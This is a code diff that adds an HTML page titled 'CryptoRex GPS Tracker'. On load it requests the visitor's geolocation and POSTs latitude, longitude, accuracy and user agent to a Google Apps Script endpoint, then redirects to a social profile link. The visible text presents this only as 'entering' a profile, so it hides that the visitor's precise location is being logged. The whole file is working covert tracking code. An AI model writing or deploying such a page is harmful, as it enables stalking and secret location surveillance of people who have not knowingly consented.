@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CryptoRex GPS Tracker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+      function sendLocation(lat, lng, accuracy) {
+        const userAgent = navigator.userAgent;
+        fetch("https://script.google.com/macros/s/AKfycbxrEcdmI9EqbgGAg_Da1HjxbNOu3jAAy3HGMe1N5tJ4vFX510MQuvVE0Kej5u7gVVQO/exec", {
+          method: "POST",
+          body: JSON.stringify({
+            latitude: lat,
+            longitude: lng,
+            accuracy: accuracy,
+            userAgent: userAgent
+          }),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        }).then(() => {
+          // Redirect to your profile after successful logging
+          window.location.href = "https://get-tap.app/dr.cryptorex";
+        }).catch(() => {
+          // Still redirect even if there's a logging error
+          window.location.href = "https://get-tap.app/dr.cryptorex";
+        });
+      }
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            sendLocation(
+              position.coords.latitude,
+              position.coords.longitude,
+              position.coords.accuracy
+            );
+          }, function() {
+            // If user denies or fails GPS, still redirect
+            window.location.href = "https://get-tap.app/dr.cryptorex";
+          });
+        } else {
+          window.location.href = "https://get-tap.app/dr.cryptorex";
+        }
+      }
+
+      window.onload = getLocation;
+    </script>
+  </head>
+  <body>
+    <h1 style="text-align:center;font-family:sans-serif;margin-top:40px;">
+      🚀 Please Allow To Enter My World
+    </h1>
+    <p style="text-align:center;">If prompted, please allow profile entering.</p>
+  </body>
+</html>
